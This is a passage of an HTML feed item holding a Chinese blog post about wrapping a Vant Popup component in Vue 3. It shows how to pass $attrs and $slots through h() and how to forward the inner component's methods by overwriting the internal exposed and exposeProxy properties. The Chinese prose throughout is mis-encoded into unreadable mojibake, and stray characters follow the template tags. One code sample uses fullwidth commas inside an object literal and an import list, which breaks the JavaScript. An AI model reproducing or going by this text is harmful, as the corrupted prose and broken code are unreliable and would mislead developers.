mathnormal">s</span><span class="mord cjk_fallback">ï¼Œè€Œåœ¨ä½¿ç”¨</span><span class="mord mathnormal">h</span><span class="mord cjk_fallback">å‡½æ•°æ—¶ï¼Œ</span></span></span></span></span>slotsæ°å¥½æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œæ˜¯ä¸æ˜¯ç®€å•å¾ˆå¤šã€‚ä¸‹é¢æˆ‘ä»¬æ¥ä¿®æ”¹ä¸€ä¸‹æˆ‘ä»¬çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>è‡ªå·±å°è£…çš„popup,ä¸€äº›è‡ªå®šå†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">component</span>
      <span class="hljs-attr">:is</span>=<span class="hljs-string">"h(Popup, { ...$attrs }, $slots)"</span>
    &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>Ã
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, h } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Popup</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'vant'</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>Ã
</code></pre>
<p>ä¸‹é¢æˆ‘ä»¬æ¥è§£å†³æš´éœ²æ–¹æ³•çš„é—®é¢˜ï¼Œä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬æ˜¯é€šè¿‡defineExposeå°†ç¬¬ä¸‰æ–¹ç»„ä»¶çš„æ–¹æ³•ä¸€ä¸€æš´éœ²å‡ºå»çš„ï¼Œè¿™æ ·å†™æœ‰ä¸€ç‚¹éº»çƒ¦ã€‚å®é™…ä¸Šåœ¨ Vue 3 ä¸­ï¼Œ<code>getCurrentInstance()</code> è¿”å›çš„ç»„ä»¶å®ä¾‹å¯¹è±¡åŒ…å«ä¸€ä¸ª <code>exposed</code> å±æ€§ï¼Œå’ŒdefineExposeçš„åŠŸèƒ½ä¸€æ ·ï¼Œéƒ½æ˜¯æš´éœ²ç»„ä»¶çš„å±æ€§ç»™çˆ¶ç»„ä»¶ä½¿ç”¨ã€‚é‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠ<em>Popup</em>ç»„ä»¶å®ä¾‹é€šè¿‡refèµ‹å€¼ç»™exposedï¼Œä»è€Œæš´éœ²æ–¹æ³•å‡ºå»ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>è‡ªå·±å°è£…çš„popup,ä¸€äº›è‡ªå®šä¹‰å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">component</span>
      <span class="hljs-attr">:is</span>=<span class="hljs-string">"h(Popup, { ...$attrsï¼Œref: changeRef }, $slots)"</span>
    &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>Ã
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { refï¼ŒgetCurrentInstanceï¼Œh } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Popup</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'vant'</span>
<span class="hljs-keyword">const</span> vm = <span class="hljs-title function_">getCurrentInstance</span>()
<span class="hljs-keyword">const</span> <span class="hljs-title function_">changeRef</span> = (<span class="hljs-params">instance</span>) =&gt; {
   <span class="hljs-comment">// instanceä¸ºç»„ä»¶å®ä¾‹</span>
  vm.<span class="hljs-property">exposeProxy</span> = vm.<span class="hljs-property">exposed</span> = instance || {}
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>Ã
</code></pre>
<p>ä¸Šé¢è¿™æ ·çš„å°è£…å†™æ³•ï¼Œä»£ç ç®€æ´äº†å¾ˆå¤šï¼Œä½†æ˜¯å´æœ‰äº›éš¾ä»¥ç†è§£ã€‚</p>
<ol>
<li>é¦–å…ˆæˆ‘ä»¬ä½¿ç”¨å‡½æ•°æ¨¡ç‰ˆå¼•ç”¨çš„æ–¹å¼ï¼Œæ‹¿åˆ°popupçš„ç»„ä»¶å®ä¾‹ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8c5e8d42eb540fc92b10a52b6bb36a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rW35bCU5pm65oWn5a625oqA5pyv5bmz5Y-w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766043639&amp;x-signature=HN4d4oKsFXwhaJCZIv0pZULbtbA%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>
<p>é€šè¿‡<code>exposed</code>æŠŠpopupç»„ä»¶æ–¹æ³•æš´éœ²ç»™çˆ¶ç»„ä»¶ã€‚popupçš„ç»„ä»¶å®ä¾‹ä¸Šæœ‰ç»„ä»¶æ–¹æ³•ï¼ŒæŠŠç»„ä»¶å®ä¾‹èµ‹å€¼ç»™<code>exposed</code>å±æ€§åï¼Œ<code>exposed</code>å°±æœ‰äº†è¯¥ç»„ä»¶çš„æ–¹æ³•ã€‚</p>
</li>
<li>
<p>exposeProxyæ˜¯exposedå±æ€§çš„ä»£ç†ï¼Œçˆ¶ç»„ä»¶å®ä¾‹è®¿é—®çš„æ˜¯exposeProxyçš„å±æ€§ã€‚</p>
</li>
</ol>
<p>é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬ä¼šä½¿ç”¨defineExposeæš´éœ²ç»„ä»¶çš„æ–¹æ³•ç»™çˆ¶ç»„ä»¶ä½¿ç”¨ï¼Œè€Œ<code>exposed</code> å±æ€§å­˜å‚¨äº†é€šè¿‡ <code>defineExpose</code> æ˜¾å¼æš´éœ²ç»™çˆ¶ç»„ä»¶çš„å±æ€§å’Œæ–¹æ³•ï¼Œä»…å¯¹çˆ¶ç»„ä»¶å¯è§ã€‚æˆ‘ä»¬å¯ä»¥åå‘æ€è€ƒä¸€ä¸‹ï¼Œç»™<code>exposed</code>ç›´æ¥èµ‹å€¼ï¼Œçˆ¶ç»„ä»¶ä¹Ÿæ˜¯å¯è§çš„ã€‚</p>
<p>ä¸Šé¢ä»…ä»…æ˜¯æä¾›äº†ä¸€ç§vue3ç»„ä»¶äºŒæ¬¡å°è£…çš„æ–¹å¼ï¼Œä»£ç æ¯”è¾ƒç²¾ç®€ï¼Œä½†æ˜¯æ¯”è¾ƒéš¾ç†è§£ã€‚å½“æœ‰æ›´å¤šè¦æ±‚æ—¶ï¼Œè¿˜éœ€è¦å†ä¼˜åŒ–ã€‚æ¯”å¦‚å¤–å±‚domä¸éœ€è¦çˆ¶ç»„ä»¶é€ä¼ çš„å±æ€§ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®defineOptions({inheritAttrs: false})ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡useAttrsè®¿é—®æ‰€æœ‰é€ä¼ çš„å±æ€§å€¼ã€‚</p>
<h2 data-id="heading-5">6. å›¢é˜Ÿä»‹ç»</h2>
<p>ã€Œ<strong>ä¸‰ç¿¼é¸Ÿæ•°å­—åŒ–æŠ€æœ¯å¹³å°-åº”ç”¨è½¯ä»¶æ¡†æ¶å¼€å‘</strong>ã€ä¸»è¦è´Ÿè´£è®¾è®¡å·¥å…·çš„ç ”å‘ï¼ŒåŒ…æ‹¬è¥é”€è®¾è®¡å·¥å…·ã€å®¶ç”µVRè®¾è®¡å’Œå±•ç¤ºã€æ°´ç”µæš–é€šå‰ç½®è®¾è®¡èƒ½åŠ›ï¼Œç ”å‘å¹¶æ²‰æ·€ç´ æåº“ï¼Œæ„å»ºå®¶å±…å®¶è£…ç´ æåº“ï¼Œé›†æˆæˆ·å‹åº“ã€å…¨å“ç±»äº§å“åº“ã€è®¾è®¡æ–¹æ¡ˆåº“ã€ç”Ÿäº§å·¥è‰ºæ¨¡å‹ï¼Œæ‰“é€ åŸºäºæˆ·å‹å’Œé£æ ¼çš„AIè®¾è®¡èƒ½åŠ›ï¼Œå¿«é€Ÿç”Ÿæˆç®—é‡å’ŒæŠ¥ä»·ï¼›åŒæ—¶ç ”å‘äº†é—¨åº—è®¾è®¡å¸ˆä¸­å¿ƒå’Œé¡¹ç›®ä¸­å¿ƒï¼ŒåŒ…æ‹¬è®¾è®¡å¸ˆç®¡ç†èƒ½åŠ›å’Œé¡¹ç›®ç»ç†ç®¡ç†èƒ½åŠ›ã€‚å®ç°äº†åœºæ™¯å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼ŒåŒæ—¶ä¸ºæ°´ï¼Œç©ºæ°”ï¼Œå¨æˆ¿ç­‰äº§ä¸šæä¾›å•†æœºç®¡ç†å·¥å…·ï¼Œä»è€Œå®ç°äº†ä»¥åœºæ™¯è´¯ç©¿çš„Bç«¯Cç«¯å…¨æµç¨‹ç³»ç»Ÿã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>